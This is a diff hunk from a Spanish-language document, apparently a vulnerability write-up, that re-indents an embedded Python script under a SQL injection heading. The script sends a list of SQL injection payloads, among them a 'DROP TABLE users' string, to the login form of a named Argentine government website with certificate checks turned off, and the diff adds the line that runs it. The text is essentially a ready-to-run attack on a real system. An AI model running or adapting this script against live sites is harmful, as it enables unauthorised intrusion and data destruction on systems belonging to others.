@@ -551,49 +551,50 @@ mucho tiempo...
 - WE-89 – SQL Injection
   -  Script de Inyección SQL Automatizado
       ```text
-                  #!/usr/bin/env python3
-                     
-                import requests
-                import sys
-                import urllib3
-                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-                
-                def test_sql_injection(url, payloads):
-                    print(f"[+] Testing SQL Injection on: {url}")
-                    
-                    for payload in payloads:
-                        try:
-                            data = {
-                                "accion": "login",
-                                "recaptcha_response": "dummy",
-                                "datastring": f"txtUsuario={payload}&txtPassword=test"
-                            }
+                                 #!/usr/bin/env python3
+                        import requests
+                        import sys
+                        import urllib3
+                        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+                        
+                        def test_sql_injection(url, payloads):
+                            print(f"[+] Testing SQL Injection on: {url}")
                             
-                            response = requests.post(url, data=data, verify=False, timeout=10)
+                            for payload in payloads:
+                                try:
+                                    data = {
+                                        "accion": "login",
+                                        "recaptcha_response": "dummy",
+                                        "datastring": f"txtUsuario={payload}&txtPassword=test"
+                                    }
+                                    
+                                    response = requests.post(url, data=data, verify=False, timeout=10)
+                                    
+                                    if "error" in response.text.lower() or "sql" in response.text.lower():
+                                        print(f"[!] Possible SQLi with payload: {payload}")
+                                        print(f"Response: {response.text[:200]}...")
+                                        
+                                    elif response.status_code != 200:
+                                        print(f"[?] Unexpected status code: {response.status_code}")
+                                        
+                                except Exception as e:
+                                    print(f"[X] Error with payload {payload}: {e}")
+                        
+                        if __name__ == "__main__":
+                            target_url = "https://siper.vialidad.gob.ar/go/app-index-x.php"
                             
-                            if "error" in response.text.lower() or "sql" in response.text.lower():
-                                print(f"[!] Possible SQLi with payload: {payload}")
-                                print(f"Response: {response.text[:200]}...")
-                                
-                            elif response.status_code != 200:
-                                print(f"[?] Unexpected status code: {response.status_code}")
-                                
-                        except Exception as e:
-                            print(f"[X] Error with payload {payload}: {e}")
-                
-                if __name__ == "__main__":
-                    target_url = "https://siper.vialidad.gob.ar/go/app-index-x.php"
-                    
-                    # Payloads comunes de SQL Injection
-                    sql_payloads = [
-                        "' OR '1'='1'-- -",
-                        "admin'--",
-                        "' UNION SELECT NULL-- -",
-                        "'; DROP TABLE users;--",
-                        "' OR 1=1#",
-                        "admin'/*",
-                        "' AND 1=CONVERT(int,(SELECT user))--"
-                    ]
+                            # Payloads comunes de SQL Injection
+                            sql_payloads = [
+                                "' OR '1'='1'-- -",
+                                "admin'--",
+                                "' UNION SELECT NULL-- -",
+                                "'; DROP TABLE users;--",
+                                "' OR 1=1#",
+                                "admin'/*",
+                                "' AND 1=CONVERT(int,(SELECT user))--"
+                            ]
+                            
+                            test_sql_injection(target_url, sql_payloads) 
                     
       ```      
     
